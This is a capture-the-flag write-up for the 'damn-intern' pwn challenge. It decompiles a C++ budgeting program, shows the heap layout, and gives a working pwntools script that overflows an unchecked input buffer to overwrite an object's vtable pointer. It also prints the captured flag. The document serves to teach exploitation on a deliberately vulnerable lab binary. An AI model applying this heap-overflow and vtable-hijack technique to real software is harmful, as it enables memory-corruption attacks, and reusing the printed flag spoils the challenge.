# damn-intern

[library.m0unt41n.ch/challenges/damn-intern](https://library.m0unt41n.ch/challenges/damn-intern) ![](../../resources/pwn.svg) ![](../../resources/easy.svg) 

# TL;DR

Overwrite VPTR in a C++ program, using a conveniently located unprotected buffer.

# The program

A simple dialog:

```
What do you want to do?
1) Ask for budget
2) See how much money will be spent
3) See an ASCII art of an unicorn
4) Exit
>1
Description: Test
Amount:1111
Sadly we cannot allocate budget for this.
```

# Analysis

The program has all the symbols and is relatively easy to reason about and/or fully decompile.
It's a bit annoying as one has to dig through *tons* of C++ boilerplate produced by IDA.
Let's do it, just for some C++ decompilation practice:

```c++
#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>

std::vector<std::pair<std::string, int>> budget;

class AllocateBudget {
  public:
    virtual void addToBudget(std::string description, int amount) {};
};

class AllocateBudgetFinance : public AllocateBudget {
  public:
    void addToBudget(std::string description, int amount) {
       budget.push_back(std::make_pair(description, amount));
       std::cout <<" Successfully added " << amount << "CHF for \"" << description << "\"." << std::endl;
    }
};

class AllocateBudgetOther : public AllocateBudget {
  public:
    void addToBudget(std::string description, int amount) {
      std::cout << "Sadly we cannot allocate budget for this." << std::endl;
    }
};

int calculateTotalBudget() {
  int total = 0;
  for (auto & item : budget)
    total += item.second;
  return total;
}

std::string *getFlag() {
  if (char* env_p = std::getenv("FLAG"))
    return new std::string(env_p);
  else
    return new std::string("shc2024{placeholder}");
}


int main(void) {
  char *work = new char[0x40];
  AllocateBudget *finance = new AllocateBudgetFinance();
  AllocateBudget *other = new AllocateBudgetOther();

  std::cout << "Do you work for the company? ";
  std::cin >> work;
  if (work[0] == 'y') {
    std::cout << "Welcome to the new advanced and modern budgeting system created by a very talented intern!" << std::endl;

    std::string ascii_art("\n"
    "  ______   _______                   __                        __      __                     \n"
    " /      \\ /       \\                 /  |                      /  |    /  |                    \n"
    "/$$$$$$  |$$$$$$$  | __    __   ____$$ |  ______    ______   _$$ |_   $$/  _______    ______  \n"
    "$$ |__$$ |$$ |__$$ |/  |  /  | /    $$ | /      \\  /      \\ / $$   |  /  |/       \\  /      \\ \n"
    "$$    $$ |$$    $$< $$ |  $$ |/$$$$$$$ |/$$$$$$  |/$$$$$$  |$$$$$$/   $$ |$$$$$$$  |/$$$$$$  |\n"
    "$$$$$$$$ |$$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |  $$ | __ $$ |$$ |  $$ |$$ |  $$ |\n"
    "$$ |  $$ |$$ |__$$ |$$ \\__$$ |$$ \\__$$ |$$ \\__$$ |$$$$$$$$/   $$ |/  |$$ |$$ |  $$ |$$ \\__$$ |\n"
    "$$ |  $$ |$$    $$/ $$    $$/ $$    $$ |$$    $$ |$$       |  $$  $$/ $$ |$$ |  $$ |$$    $$ |\n"
    "$$/   $$/ $$$$$$$/   $$$$$$/   $$$$$$$/  $$$$$$$ | $$$$$$$/    $$$$/  $$/ $$/   $$/  $$$$$$$ |\n"
    "                                        /  \\__$$ |                                  /  \\__$$ |\n"
    "                                        $$    $$/                                   $$    $$/ \n"
    "                                         $$$$$$/                                     $$$$$$/  \n"
    "  ");
    std::cout << ascii_art << std::endl;

    finance->addToBudget("Coffee for the finance team", 1000);

    std::string unicorn("\n"
    "`\\\n"
    "  \\\\,\n"
    "   \\\\\\,^,.,,.\n"
    "   ,;7~((\\))`;;,,\n"
    "   ,(@') ;)`))\\;;',\n"
    "    )  . ),((  ))\\;,\n"
    "   /;`,,/7),)) )) )\\,,      ,,,... ,\n"
    "  (& )`   (,((,((;( ))\\,_,,;'`    `\\\\,\n"
    "   `\"    ` ), ))),/( (            `)\\,\n"
    "          '1/';/;  `               ))),\n"
    "           (, (     /         )    ((/,\n"
    "          / \\                /     ((('\n"
    "         ( 6--\\%  ,>     ,,,(     /'))\\'\n"
    "          \\,\\,/ ,/`----~`\\   \\    >,))))'\n"
    "            \\/ /          `--7>' /((((('\n"
    "            (,9             // /'('((\\\\\\,\n"
    "             \\ \\,,         (/,/   '\\`\\\\'\\\n"
    "              `\\_)1        (_)Kk    `\\`\\\\`\\\n"
    "                `\\|         \\Z          `\\\n"
    "                  `          \"            `\n");

    std::string options("\n"
    "What do you want to do?\n"
    "1) Ask for budget\n"
    "2) See how much money will be spent\n"
    "3) See an ASCII art of an unicorn\n"
    "4) Exit");
    std::cout << options << std::endl;

    while(1) {
      std::string answer, description;
      std::cout << "> ";
      std::cin >> answer;
      if (answer == "1") {
        int amount;
        std::cout << "Description: ";
        std::cin >> description;
        std::cout << "Amount: ";
        std::cin >> amount;
        other->addToBudget(description, amount);
      } else if (answer=="2") {
        int total = calculateTotalBudget();
        if (total>99999) {
          std::string flag = *getFlag();
          std::cout << flag << std::endl;
        }
        std::cout << "Total allocated budget: " << total << std::endl;
      } else if (answer=="3") {
         std::cout << unicorn << std::endl;
      } else if (answer=="4") {
         break;
      } else {
         std::cout << "Command doesn't exist" << std::endl;
      }
    }
  }
  return 0;
}
```

To get the flag, we need to get the total budget above 99999CHF and call _"See how much money will be spent"_.
There is a problem though: the code adding money to the budget based on user input is using `AllocateBudgetOther`,
which refuses to add entries to the `budget` vector (as opposed to `AllocateBudgetFinance`).

# Vulnerability

Observation: the `work` buffer (`"Do you work for the company?"` response) buffer is unprotected
and should enable us to overwrite whatever comes after it on the heap. 

Single stepping through the program in IDA we notice that `work` is very close to `finance` and
`other` objects - and the only meaningful information in these objects is the pointer to
`addToBudget` method.

Overall the hex dump of that part of heap looks like:

```
00000000xxxxx2A0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  ................   padding and/or heap data
00000000xxxxx2B0  79 79 79 79 79 79 79 79  79 79 79 79 79 79 79 79  yyyyyyyyyyyyyyyy   work
00000000xxxxx2C0  79 79 79 79 79 79 79 79  79 79 79 79 79 79 79 79  yyyyyyyyyyyyyyyy   work
00000000xxxxx2D0  79 79 79 79 79 79 79 79  79 79 79 79 79 79 79 79  yyyyyyyyyyyyyyyy   work
00000000xxxxx2E0  79 79 79 79 79 79 79 79  79 79 79 79 79 79 79 79  yyyyyyyyyyyyyyyy   work
00000000xxxxx2F0  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00  ........!.......   padding and/or heap data
00000000xxxxx300  98 67 40 00 00 00 00 00  00 00 00 00 00 00 00 00  .g@.............   finance
00000000xxxxx310  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00  ........!.......   padding and/or heap data
00000000xxxxx320  80 67 40 00 00 00 00 00  00 00 00 00 00 00 00 00  .g@.............   other
00000000xxxxx330  00 00 00 00 00 00 00 00  11 04 00 00 00 00 00 00  ................   padding and/or heap data
```

(All the heap addresses are different every time, but the layout is the same)

What we have there:

*   `work` buffer is at `xxxxx2B0`
*   `finance` variable is at `0xxxxxx300` and holds a pointer to `AllocateBudgetFinance::addToBudget` (`0x406798`)
*   `other` variable is at `0xxxxxx320` and holds a pointer to `AllocateBudgetOther::addToBudget` (`0x406780`)

(More precisely, above two are _indirect_ pointers, the actual methods are `0x402C1A` and `0x4027A3` respectively,
but, this is good enough for our purposes)

# Exploit

All this makes for an easy exploit: we need to overflow `work` buffer, copying the `finance` indirect pointer
address to `other`, so that it will behave like `AllocateBudgetFinance`. Ideally, preserving other bytes in the
middle (which conveniently are always the same too). Then, _"adding to budget"_ works and, in the end, we can
get the flag:

```python
import pwn
pwn.context(arch='amd64', os='linux')

payload =  b'y'*64
payload += b'\x00' * 8
payload += b'\x21'
payload += b'\x00' * 7
payload += b'\x98\x67\x40'
payload += b'\x00' * 21
payload += b'\x21'
payload += b'\x00' * 7
payload += b'\x98\x67\x40'

io = pwn.process("./damn-intern")
io.sendline(payload)
io.sendline(b"1")
io.sendline(b"GiveMeFlag")
io.sendline(b"99000")
io.sendline(b"2")
io.sendline(b"4")
io.interactive()
```

Result:

```
[+] Starting local process './damn-intern': pid 50281
[*] Switching to interactive mode
Do you work for the company?
Welcome to the new advanced and modern budgeting system created by a very talented intern!
  ______   _______                   __                        __      __                     
 /      \ /       \                 /  |                      /  |    /  |                    
/$$$$$$  |$$$$$$$  | __    __   ____$$ |  ______    ______   _$$ |_   $$/  _______    ______  
$$ |__$$ |$$ |__$$ |/  |  /  | /    $$ | /      \  /      \ / $$   |  /  |/       \  /      \ 
$$    $$ |$$    $$< $$ |  $$ |/$$$$$$$ |/$$$$$$  |/$$$$$$  |$$$$$$/   $$ |$$$$$$$  |/$$$$$$  |
$$$$$$$$ |$$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |  $$ | __ $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |$$ |__$$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |$$$$$$$$/   $$ |/  |$$ |$$ |  $$ |$$ \__$$ |
$$ |  $$ |$$    $$/ $$    $$/ $$    $$ |$$    $$ |$$       |  $$  $$/ $$ |$$ |  $$ |$$    $$ |
$$/   $$/ $$$$$$$/   $$$$$$/   $$$$$$$/  $$$$$$$ | $$$$$$$/    $$$$/  $$/ $$/   $$/  $$$$$$$ |
                                        /  \__$$ |                                  /  \__$$ |
                                        $$    $$/                                   $$    $$/ 
                                         $$$$$$/                                     $$$$$$/  

Succesfully added 1000CHF for "Coffee for the finance team".

What do you want to do?
1) Ask for budget
2) See how much money will be spent
3) See an ASCII art of an unicorn
4) Exit
>Description: Amount:Succesfully added 99000CHF for "GiveMeFlag".
>shc2024{placeholder}
Total allocated budget: 100000
```

# The flag

Calling the remote instance instead:

```python
io = pwn.remote('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch', 1337, ssl=True)
```

we get the flag

---

## `shc2024{cf9e0eccd9346026c0b6876e0e0155}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
